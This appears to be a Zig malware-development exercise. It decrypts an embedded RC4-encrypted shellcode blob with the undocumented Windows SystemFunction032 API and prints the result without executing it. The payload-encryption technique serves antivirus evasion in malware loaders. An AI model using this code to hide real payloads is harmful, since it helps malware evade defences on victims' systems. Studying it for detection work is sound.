const std = @import("std");
const windows = std.os.windows;
const WINAPI = windows.WINAPI;

const RC4_KEY: [16]u8 = [_]u8{
    0xe4, 0x71, 0xfd, 0x58, 0xd5, 0x42, 0x9f, 0x37, 0x18, 0x8c, 0x4e, 0x83, 0x1e, 0xee, 0xd9, 0x57
};

const RC4_CIPHERTEXT: [193]u8 = [_]u8{
    0x1a, 0x41, 0x1f, 0xfb, 0x9f, 0x44, 0xef, 0x02, 0xfc, 0xa8, 0xf9, 0xe7, 0x42, 0x3f, 0x8e, 0xba, 
    0x68, 0x97, 0xd0, 0xae, 0xb1, 0x16, 0x0a, 0x60, 0xed, 0xe2, 0x13, 0xd5, 0x43, 0x10, 0xcc, 0xfd, 
    0x47, 0xdc, 0xe7, 0xe9, 0x2b, 0xfa, 0x14, 0x19, 0xe7, 0xcf, 0x8e, 0x06, 0xe8, 0xf9, 0x89, 0xb5, 
    0x48, 0x56, 0x39, 0xa1, 0xc9, 0x06, 0x23, 0x90, 0xb7, 0xa1, 0x85, 0x79, 0xc9, 0xaa, 0x07, 0x42, 
    0xb0, 0xcd, 0xe0, 0x60, 0x43, 0xb8, 0x2e, 0x97, 0xb1, 0x18, 0x7c, 0x01, 0x1e, 0xc0, 0x0d, 0xe0, 
    0xa1, 0xfa, 0xf0, 0xd0, 0x1a, 0x40, 0x1c, 0x90, 0x5f, 0x20, 0xf7, 0xed, 0xcb, 0x09, 0xd9, 0x69, 
    0x0a, 0xf2, 0x88, 0xfa, 0xf9, 0x26, 0x3d, 0xae, 0x6b, 0x41, 0xe5, 0xd0, 0xb5, 0x5d, 0x97, 0xf9, 
    0x50, 0x1a, 0xdf, 0x02, 0x80, 0x50, 0xca, 0x96, 0x57, 0x7e, 0x84, 0x34, 0x84, 0x9a, 0xa7, 0x48, 
    0xa8, 0x0b, 0xe0, 0xfa, 0x30, 0xe9, 0xff, 0x10, 0x5f, 0x89, 0xd6, 0x61, 0x9f, 0xc6, 0x68, 0x89, 
    0x26, 0xb3, 0xdf, 0xbd, 0x06, 0x97, 0x0b, 0xf3, 0x9f, 0x1d, 0xba, 0xa8, 0xe6, 0x16, 0xa9, 0x84, 
    0x0d, 0xbf, 0x8b, 0x17, 0x2a, 0x1b, 0x9f, 0xe3, 0xca, 0x9f, 0x3c, 0x98, 0x04, 0xd9, 0x00, 0x96, 
    0x05, 0xfc, 0x5f, 0x56, 0xce, 0x1d, 0xc4, 0xad, 0x74, 0x62, 0xe1, 0xb8, 0x20, 0xcd, 0x73, 0xae, 
    0x2b
};

// SystemFunction032 parameter structure
const USTRING = extern struct {
    length: u32,
    maximum_length: u32,
    buffer: [*]u8,
};

fn rc4Decryption(rc4_key: []const u8, rc4_ciphertext: []u8, allocator: std.mem.Allocator) ![]u8 {
    const advapi32 = try windows.kernel32.LoadLibraryA("Advapi32");
    const SystemFunction032 = @as(
        *const fn(*USTRING, *USTRING) callconv(WINAPI) i32,
        @ptrCast(windows.kernel32.GetProcAddress(advapi32, "SystemFunction032").?),
    );

    var key = try allocator.dupe(u8, rc4_key);
    defer allocator.free(key);
    var payload_data = try allocator.dupe(u8, rc4_ciphertext);

    var key_struct = USTRING{
        .length = @intCast(rc4_key.len),
        .maximum_length = @intCast(rc4_key.len),
        .buffer = key.ptr,
    };
    var img_struct = USTRING{
        .length = @intCast(rc4_ciphertext.len),
        .maximum_length = @intCast(rc4_ciphertext.len),
        .buffer = payload_data.ptr,
    };

    const status = SystemFunction032(&img_struct, &key_struct);
    if (status != 0) {
        allocator.free(payload_data);
        std.debug.panic("SystemFunction032 FAILED with error: 0x{:08x}\n", .{@as(u32, @bitCast(status))});
    }

    return payload_data;
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    var ciphertext = RC4_CIPHERTEXT;
    const shellcode = try rc4Decryption(&RC4_KEY, &ciphertext, allocator);
    defer allocator.free(shellcode);
    std.debug.print("Decrypted shellcode length: {}\n", .{shellcode.len});
    std.debug.print("Decrypted shellcode: {any}\n", .{shellcode});
}
